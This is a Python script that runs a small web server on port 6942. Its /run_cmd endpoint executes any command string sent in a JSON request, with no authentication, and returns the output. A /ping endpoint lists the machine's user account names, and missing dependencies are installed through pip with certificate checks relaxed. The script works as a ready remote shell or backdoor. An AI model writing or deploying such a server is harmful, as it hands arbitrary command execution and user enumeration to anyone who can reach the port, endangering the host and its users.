#!/usr/bin/python3
import sys
import subprocess
import os

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--trusted-host", "pypi.org",
                          "--trusted-host", "pypi.python.org", "--trusted-host", "files.pythonhosted.org", package])


try:
    from aiohttp import web
except:
    install('aiohttp')
    from aiohttp import web
try:
    import requests
except:
    install('requests')
    import requests


async def run_cmd(request):
    data = await request.json()
    cmd = data['cmd'].split(' ')
    try:
        result = subprocess.run(cmd, stdout=subprocess.PIPE)
    except:
        try:
            subprocess.Popen(data['cmd'], stdout=subprocess.PIPE)
            result = 'Opened '+data['cmd']+' successfully'
            return web.json_response({'response': result})
        except:
            result = 'Execution failed; reason unknown'
            return web.json_response({'response': result})
    else:
        result = result.stdout.decode('utf-8')
    return web.json_response({'response': result})


async def ping(request):
    users = os.listdir('/Users/')
    user_users = []
    for user in users:
        if user not in ['All Users', 'Default', 'Default User', 'IT Admin', 'Public', 'desktop.ini']:
            user_users.append(user)
    return web.json_response({'users': user_users})

app = web.Application()
app.add_routes([web.post('/run_cmd', run_cmd)])
app.add_routes([web.get('/ping', ping)])

web.run_app(app, port=6942)
